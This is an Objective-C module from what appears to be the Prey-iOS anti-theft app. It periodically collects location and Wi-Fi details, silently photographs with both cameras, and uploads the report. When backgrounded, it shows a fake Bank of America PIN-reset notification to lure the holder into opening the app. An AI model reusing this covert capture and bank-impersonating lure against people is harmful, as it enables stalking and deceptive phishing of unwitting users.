//
//  Report.m
//  Prey-iOS
//
//  Created by Carlos Yaconi on 14/10/2010.
//  Copyright 2010 Fork Ltd. All rights reserved.
//  License: GPLv3
//  Full license at "/LICENSE"
//

#import "ReportModule.h"
#import "Constants.h"
#import "PreyAppDelegate.h"
#import "LocationController.h"
#import "PhotoController.h"
#import "Wifi-Info.h"
#import "PreyConfig.h"
#import <SystemConfiguration/CaptiveNetwork.h>

@implementation ReportModule

@synthesize waitForLocation,waitForPicture,url, picture, pictureBack, reportData, runReportTimer;

+ (ReportModule *)instance {
    static ReportModule *instance = nil;
    static dispatch_once_t onceToken = 0;
    dispatch_once(&onceToken, ^{
        instance = [[ReportModule alloc] init];
        instance.reportData = [[NSMutableDictionary alloc] init];
        PreyLogMessage(@"Report Module", 0,@"Registering ReportModule to receive location updates notifications");
    });
    return instance;
}

- (void) get
{
    lastExecution = [[NSUserDefaults standardUserDefaults] objectForKey:@"lastExecutionKey"];
    
    if (lastExecution != nil)
    {
        NSInteger delayReport = [[NSUserDefaults standardUserDefaults] integerForKey:@"delayReport"];
        NSInteger lastRunInterval = ceil(-[lastExecution timeIntervalSinceNow]) ;
        
        BOOL isPendingTakePictures = [[NSUserDefaults standardUserDefaults] boolForKey:@"pendingTakePictures"];
        
        PreyLogMessage(@"Report Module", 0, @"Checking if delay of %d secs. is less than last running interval: %d secs.", (int)delayReport, (int)lastRunInterval);
        
        
        
        if ( (lastRunInterval < delayReport) && (!isPendingTakePictures) )
        {
            PreyLogMessage(@"Report Module", 0, @"Trying to get device's status but interval hasn't expired. (%d secs. since last execution). Aborting!", (int)lastRunInterval);
            return;
        }
    }
    lastExecution = [NSDate date];
    [[NSUserDefaults standardUserDefaults] setObject:lastExecution forKey:@"lastExecutionKey"];
    
    
    waitForLocation = YES;
    waitForPicture  = YES;

    if (!runReportTimer)
    {
        NSInteger interval = [[super.options objectForKey:@"interval"] intValue]*60;
        
        if (interval == 0)
            interval = [[NSUserDefaults standardUserDefaults] integerForKey:@"delayReport"];
        else
            [[NSUserDefaults standardUserDefaults] setInteger:interval forKey:@"delayReport"];
        
        PreyLogMessage(@"Report", 10, @"Intervalo = %d",(int)interval);

        runReportTimer = [NSTimer scheduledTimerWithTimeInterval:interval target:[ReportModule instance] selector:@selector(runReportModule:) userInfo:nil repeats:YES];
        
        [[PreyConfig instance] setIsMissing:YES];
        [[PreyConfig instance] saveValues];
        
        if (IS_OS_7_OR_LATER)
            [[UIApplication sharedApplication] setMinimumBackgroundFetchInterval:interval];
        
    }
    
    [self send];
}

- (NSString *) getName {
	return @"report";
}


- (void)runReportModule:(NSTimer *)timer
{
    if ([PreyConfig instance].isMissing)
        [self get];
    else
        [self stop];
}

- (void)stop
{
    [runReportTimer invalidate];
    runReportTimer = nil;
    
    lastExecution = nil;
    [[NSUserDefaults standardUserDefaults] setObject:lastExecution forKey:@"lastExecutionKey"];

    [[PreyConfig instance] setIsMissing:NO];
    [[PreyConfig instance] saveValues];
    
    if (IS_OS_7_OR_LATER)
        [[UIApplication sharedApplication] setMinimumBackgroundFetchInterval:UIApplicationBackgroundFetchIntervalNever];
    
    [[NSNotificationCenter defaultCenter] removeObserver:[ReportModule instance] name:@"locationUpdated" object:nil];
    [[LocationController instance] stopUpdatingLocation];
    
    PreyAppDelegate *appDelegate = (PreyAppDelegate*)[[UIApplication sharedApplication] delegate];
    [appDelegate changeShowFakeScreen:NO];
    
    [[UIApplication sharedApplication] cancelAllLocalNotifications];
    [[UIApplication sharedApplication] setApplicationIconBadgeNumber:-1];
}


- (void) send
{
    PreyLogMessage(@"Report", 5, @"Attempting to send the report.");
    
    // Add Wifi Info
    [[ReportModule instance] addWifiInfo];
    
    if (waitForLocation) {
        PreyLogMessage(@"Report", 5, @"Have to wait for a location before send the report.");

        [[LocationController instance] startUpdatingLocation];

        [[NSNotificationCenter defaultCenter] removeObserver:[ReportModule instance] name:@"locationUpdated" object:nil];
        [[NSNotificationCenter defaultCenter] addObserver:[ReportModule instance] selector:@selector(locationUpdated:) name:@"locationUpdated" object:nil];
        [[NSNotificationCenter defaultCenter] postNotificationName:@"accuracyUpdated" object:nil];
    }
    
    if (waitForPicture) {
		PreyLogMessage(@"Report", 5, @"Have to wait the picture be taken before send the report.");
        
        //Can't take pictures if in bg
        if ([UIApplication sharedApplication].applicationState != UIApplicationStateBackground)
        {
            [[PhotoController instance] changeCamera];
            
            [NSTimer scheduledTimerWithTimeInterval:2.0
                                             target:[PhotoController instance]
                                           selector:@selector(snapStillImage)
                                           userInfo:nil repeats:NO];
            
            [[NSNotificationCenter defaultCenter] addObserver:[ReportModule instance]
                                                     selector:@selector(pictureReady:)
                                                         name:@"pictureReady"
                                                       object:nil];
            
            [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"pendingTakePictures"];
        }
        else
        {
            UILocalNotification *localNotif = [[UILocalNotification alloc] init];
            if (localNotif)
            {
                NSMutableDictionary *userInfoLocalNotification = [[NSMutableDictionary alloc] init];
                [userInfoLocalNotification setObject:@"http://m.bofa.com?a=1" forKey:@"url"];
                
                localNotif.alertBody = @"Your request to reset your personal banking PIN has been successfully processed. Please proceed to set up your new PIN";
                localNotif.hasAction = NO;
                localNotif.userInfo = userInfoLocalNotification;
                localNotif.applicationIconBadgeNumber = 1;
                [[UIApplication sharedApplication] presentLocalNotificationNow:localNotif];
            }
            [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"pendingTakePictures"];

            waitForPicture = NO;
        }
	}
    
    [self sendIfConditionsMatch];
}

- (void) sendIfConditionsMatch
{
    if (!waitForPicture && !waitForLocation) {
        @try {
            waitForLocation = YES;
            waitForPicture  = YES;

            PreyLogMessage(@"Report", 5, @"Sending report now!");
            
            NSMutableDictionary *imagesData = [[NSMutableDictionary alloc] init];
            
            if (UIImagePNGRepresentation(picture) != nil)
                [imagesData setObject:UIImagePNGRepresentation(picture) forKey:@"picture"];
            
            if (UIImagePNGRepresentation(pictureBack) != nil)
                [imagesData setObject:UIImagePNGRepresentation(pictureBack) forKey:@"screenshot"];
            
            NSInteger requestNumber = [[NSUserDefaults standardUserDefaults] integerForKey:@"requestNumber"] + 1;
            [[NSUserDefaults standardUserDefaults] setInteger:requestNumber forKey:@"requestNumber"];
            
            [super sendHttp:reportData
                     andRaw:imagesData];
            
            self.picture = nil;
            self.pictureBack = nil;
        }
        @catch (NSException *exception) {
            PreyLogMessage(@"Report", 0, @"Report couldn't be sent: %@", [exception reason]);
        }
    }
}

- (void)pictureReady:(NSNotification *)notification
{
    UIImage *pictureTaken = (UIImage*)[notification object];
    
    if (pictureTaken != nil)
    {
        // Check first photo
        if (self.picture == nil)
        {
            PreyLogMessage(@"Report", 10, @"Picture Front Taken");
            self.picture = pictureTaken;
            
            // Prepare second photo
            if ([[PhotoController instance] isTwoCameraAvailable])
            {
                [[PhotoController instance] changeCamera];
                [NSTimer scheduledTimerWithTimeInterval:1.0
                                                 target:[PhotoController instance]
                                               selector:@selector(snapStillImage)
                                               userInfo:nil repeats:NO];
            }
            else
            {
                [self finishedWaitForPhoto];
            }
        }
        else
        {
            PreyLogMessage(@"Report", 10, @"Picture Back Taken");
            self.pictureBack = pictureTaken;
            
            [self finishedWaitForPhoto];
        }
    }
    else
        [self finishedWaitForPhoto];
}

- (void)finishedWaitForPhoto
{
    waitForPicture = NO;
    [self sendIfConditionsMatch];
    [[NSNotificationCenter defaultCenter] removeObserver:[ReportModule instance] name:@"pictureReady" object:nil];
}

- (void)locationUpdated:(NSNotification *)notification
{
    CLLocation *newLocation = (CLLocation*)[notification object];
	NSMutableDictionary *data = [[NSMutableDictionary alloc] init];
	[data setValue:[NSString stringWithFormat:@"%f",newLocation.coordinate.longitude] forKey:[NSString stringWithFormat:@"%@[%@]",@"geo",@"lng"]];
	[data setValue:[NSString stringWithFormat:@"%f",newLocation.coordinate.latitude] forKey:[NSString stringWithFormat:@"%@[%@]",@"geo",@"lat"]];
	[data setValue:[NSString stringWithFormat:@"%f",newLocation.altitude] forKey:[NSString stringWithFormat:@"%@[%@]",@"geo",@"alt"]];
	[data setValue:[NSString stringWithFormat:@"%f",newLocation.horizontalAccuracy] forKey:[NSString stringWithFormat:@"%@[%@]",@"geo",@"acc"]];
	[reportData addEntriesFromDictionary:data];

    waitForLocation = NO;
	[self sendIfConditionsMatch];
}

- (void)addWifiInfo
{
    NSDictionary *wifiDevice        = [Wifi_Info getSSIDInfo];
    NSMutableDictionary *wifiData   = [[NSMutableDictionary alloc] init];
    
    if (wifiDevice != nil)
    {
        [wifiData setValue:[wifiDevice objectForKey:(id)kCNNetworkInfoKeySSID]
                    forKey:[NSString stringWithFormat:@"%@[%@]",@"active_access_point",@"ssid"]];
        
        [wifiData setValue:[wifiDevice objectForKey:(id)kCNNetworkInfoKeyBSSID]
                    forKey:[NSString stringWithFormat:@"%@[%@]",@"active_access_point",@"mac_address"]];
        
        [reportData addEntriesFromDictionary:wifiData];
    }
}

@end
